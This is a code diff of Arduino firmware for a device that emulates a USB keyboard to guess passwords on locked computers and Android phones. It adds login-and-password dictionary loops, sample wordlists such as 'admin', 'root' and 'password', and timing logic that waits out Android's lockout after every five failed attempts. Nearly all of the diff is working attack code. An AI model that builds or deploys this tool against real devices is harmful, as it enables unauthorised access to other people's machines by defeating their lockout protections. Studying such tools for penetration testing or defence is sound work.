@@ -2,7 +2,7 @@
 #define USE_LOGIN false
 #define LOGIN_IN_FILES false
 //#define USE_PASSWORD true
-#define PASSWORD_IN_FILES false
+#define PASSWORD_IN_FILES true
 
 //bruteforce only works for PIN code
 #define BRUTEFORCE_PASSWORD false
@@ -44,32 +44,39 @@
   
   #if LOGIN_IN_FILES
     char *loginWordfiles[] = {"login1.txt", "login2.txt"};
-    LineByLineReadFiles login(slice{.array = loginWordfiles, .size = sizeof(loginWordfiles)}, sdCsPin);
+    LineByLineReadFiles login(slice{.array = loginWordfiles, .size = sizeof(loginWordfiles) / sizeof(char*)}, sdCsPin);   
   #endif
   #if PASSWORD_IN_FILES
     char *passwordWordfiles[] = {"pass1.txt", "pass2.txt"};
-    LineByLineReadFiles password(slice{.array = passwordWordfiles, .size = sizeof(passwordWordfiles)}, sdCsPin);
+    LineByLineReadFiles password(slice{.array = passwordWordfiles, .size = sizeof(passwordWordfiles) / sizeof(char*)}, sdCsPin);
   #endif
 #endif
 
 #if USE_LOGIN and not LOGIN_IN_FILES
   #include <LineByLine.h>
-  char *loginWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet"};
-  LineByLine login(slice{.array = loginWordlist, .size = sizeof(loginWordlist)});
+  char *loginWordlist[] = {"admin", "root"};
+  LineByLine login(slice{.array = loginWordlist, .size = sizeof(loginWordlist) / sizeof(char*)});
 #endif
 
 #if not BRUTEFORCE_PASSWORD and not PASSWORD_IN_FILES
   #include <LineByLine.h>
-  //char *passwordWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet", "1234567812345678", "test", "password", "toto", "tutu" };
-  char *passwordWordlist[] = {"1234", "1235", "1236" };
+  char *passwordWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet", "1234567812345678", "test", "password", "toto", "tutu" };
+  //char *passwordWordlist[] = {"1235", "1236" };
   LineByLine password(slice{.array = passwordWordlist, .size = sizeof(passwordWordlist) / sizeof(char*) });    
 #endif
 
+//If there is a try limit (on Android every 5 failed attemp you have to wait 30 sec.), set limit to true and limitTest to the number of attempts before a lock
+bool limit = true;
+int limitTest = 5;
+//If you are using a login and a password, when you try a new login, you may have more time to wait before getting the error message (on Windows)
+//The delayNewLogin allows you to add waiting time when trying a new login for the first time (in ms).
+int delayNewLogin = 10000;
+
 /*
-//If there is a limitation (Android: 30s to wait every 5 failed attempts)
-int limitTest = 0;
-int timeToWait = 5000;
-*/
+ * Users: Do not edit code below!
+ */
+
+int attempt = 0;
 
 #if not LCD16X2 and not CLASSIC_LCD
   void lcdStart() {}
@@ -91,28 +98,15 @@ void typeTab();
   void waitButtonPressed();
   void pauseWithButton();
 #endif
+#if ANDROID_PATTERN
+  void drawPattern(char*);
+  void moveWithoutClic(int, int);
+#endif
+void attack(char*, char*, int);
+void initMouse();
+void waitFunction();
 
-void attack(char* aPassword)
-{
-  int j;
-  for (j = 0 ; j < strlen(aPassword) ; j++) {
-    typeLetter(aPassword[j]);
-    delay(100);
-  }
-  typeEnter();
-  delay(1500);
-}
 
-//this function is used to made the system wait when system is lock (like on Android, 30s every 5 failed attempt)lorem
-void waitFunction()
-{
-
-}
-
-int attempt = 0;
-bool limit = false;
-int limitTest = 5;
-  
 void setup() {
   delay(500);
   keyboardStart();
@@ -130,25 +124,46 @@ void setup() {
 }
 
 void loop(){ 
-  while(password.hasNext()) {
-    if(limit and attempt == limitTest) {
-      waitFunction();
-      attempt = 0;
-    } else {
-      char* testedPassword = password.next();
-      #if CLASSIC_LCD or LCD16X2
-        lcdClear();
-        lcdPrint(testedPassword);
+  //initMouse();
+  #if USE_LOGIN
+  while(login.hasNext()) {
+    char* testedLogin = login.next();
+    password.init();
+    int addDelay = delayNewLogin;
+  #endif
+    while(password.hasNext()) {
+      
+      if(limit and attempt == limitTest) {
+        waitFunction();
+        attempt = 0;
+      } else {
+        
+        char* testedPassword = password.next();
+        #if CLASSIC_LCD or LCD16X2
+          lcdClear();
+          lcdPrint(testedPassword);
+        #endif
+        #if USE_LOGIN
+          attack(testedPassword, testedLogin, addDelay);
+        #else
+          attack(testedPassword, "", 0);
+        #endif
+        //free(testedPassword);
+        attempt++;
+        
+      }
+      #if USE_LOGIN
+        addDelay = 0; 
+      }
+      //free(testedLogin);
       #endif
-      attack(testedPassword);
-      //free(testedPassword);
-      attempt++;
     }
-
-  }
+  
   #if CLASSIC_LCD or LCD16X2
     lcdClear();
     lcdPrint("Attack ended");
   #endif
   while(1) {}
 }
+
+
